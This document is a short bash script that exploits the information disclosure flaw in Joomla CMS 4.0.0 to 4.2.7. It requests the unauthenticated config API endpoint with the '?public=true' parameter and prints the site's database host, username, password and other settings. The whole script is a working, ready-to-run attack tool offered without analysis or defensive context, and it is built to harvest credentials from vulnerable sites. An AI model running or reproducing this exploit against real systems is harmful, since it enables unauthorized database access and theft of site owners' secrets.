#!/bin/bash

# Validation of the number of arguments
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <URL>"
    echo "Example: $0 http://example.com"
    exit 1
fi

# URL validation
if [[ ! "$1" =~ ^https?:// ]]; then
    echo "Invalid URL. It must start with http:// or https://"
    exit 1
fi

echo "Retrieving information from the URL: $1"

# Use curl to retrieve private information from Joomla CMS 4.0.0 to 4.2.7
response=$(curl -s "$1/api/index.php/v1/config/application?public=true")

# Error handling
if [[ $? -ne 0 ]]; then
    echo "Error while performing CURL request"
    exit 1
fi

# Extract relevant information from JSON response
sitename=$(echo "$response" | jq -r '.data[] | select(.type=="application" and .attributes.sitename) | .attributes.sitename')
editor=$(echo "$response" | jq -r '.data[] | select(.type=="application" and .attributes.editor) | .attributes.editor')
captcha=$(echo "$response" | jq -r '.data[] | select(.type=="application" and .attributes.captcha) | .attributes.captcha')
access=$(echo "$response" | jq -r '.data[] | select(.type=="application" and .attributes.access) | .attributes.access')
debug=$(echo "$response" | jq -r '.data[] | select(.type=="application" and .attributes.debug) | .attributes.debug')
dbtype=$(echo "$response" | jq -r '.data[] | select(.type=="application" and .attributes.dbtype) | .attributes.dbtype')
host=$(echo "$response" | jq -r '.data[] | select(.type=="application" and .attributes.host) | .attributes.host')
user=$(echo "$response" | jq -r '.data[] | select(.type=="application" and .attributes.user) | .attributes.user')
password=$(echo "$response" | jq -r '.data[] | select(.type=="application" and .attributes.password) | .attributes.password')
dbname=$(echo "$response" | jq -r '.data[] | select(.type=="application" and .attributes.db) | .attributes.db')
dbprefix=$(echo "$response" | jq -r '.data[] | select(.type=="application" and .attributes.dbprefix) | .attributes.dbprefix')
dbencryption=$(echo "$response" | jq -r '.data[] | select(.type=="application" and .attributes.dbencryption) | .attributes.dbencryption')

# Display the retrieved information in a more structured way
echo -e "\nRetrieved information:"
echo -e "Site Info:"
echo -e "  Site name: $sitename"
echo -e "  Editor: $editor"
echo -e "  Captcha: $captcha"
echo -e "  Access: $access"
echo -e "  Debug status: $debug"
echo -e "\nDatabase Info:"
echo -e "  DB type: $dbtype"
echo -e "  DB host: $host"
echo -e "  DB user: $user"
echo -e "  DB password: $password"
echo -e "  DB name: $dbname"
echo -e "  DB prefix: $dbprefix"
echo -e "  DB encryption: $dbencryption"
